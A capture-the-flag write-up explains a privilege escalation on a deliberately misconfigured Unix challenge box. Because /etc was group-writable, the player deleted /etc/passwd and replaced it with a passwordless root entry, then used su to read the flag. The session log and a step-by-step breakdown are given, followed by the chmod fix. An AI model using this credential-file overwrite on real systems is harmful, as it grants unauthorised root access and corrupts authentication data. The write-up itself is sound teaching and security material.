## johnlions ##
Writeup by @cyphar.

### tl;dr ###
The directory `/etc` had the mode `775`, meaning you could delete and replace
(or overwrite using `/bin/mv`) files used for authentication (such as
`/etc/passwd` and `/etc/shadow`) and thus escalate to root priviliges.

### Session ###
The following is the logs from a session where the above exploit was used to
read the target file (`/flag`).

```console
$ cat /etc/passwd
root:x:0:1::/:
[...snip...]
ctf::7:3::/:
$ unlink /etc/passwd
$ cat - > /etc/passwd
root::0:1::/:
ctf::7:3::/:
$ cat /etc/passwd
root::0:1::/:
ctf::7:3::/:
$ su
# cat /flag
9447{h4cking_like_its_1979}
#
```

### What just happened? ###
Here's a breakdown of the above key commands:

#### `rm /etc/passwd` ####

This command unlinks the file `/etc/passwd`, which is allowed because the `ctf`
user has `rwx` permissions for `/etc`. This is the first part of the exploit.
Even though the `ctf` user doesn't have `rwx` permissions for `/etc/passwd`,
`ctf` can still unlink the file because of how UNIX permissions work.

#### `cat - > /etc/passwd` ####

Because `ctf` has `rwx` permissions for `/etc`, `ctf` can create a new file
within `/etc`. This is the second part of the exploit. The net result is that
cyphar could create a new authentication file allowing him to get root.

#### `su` ####

Since we have overwritten `/etc/passwd`, you can log in as `root` with no
password (NOTE: the change of the prompt from `$` to `#` indicates that the
escalation to root was successful).

#### `cat /flag` ####

This just discloses the information inside the target file, revealing the flag
and completing the challenge.

### Notes ###

* Both cyphar and auscompgeek really hate `telnet` (no line editing and
  backspace doesn't work -- grrr)
* cyphar now appreciates just how much GNU has provided in terms of
  user-friendly tools and features.
* It was also possible to exploit `/usr/lib/atrun`, as
  [another team did](http://pastebin.com/raw.php?i=8jaPWTVT).

### Mitigation ###

`chmod 755 /etc`
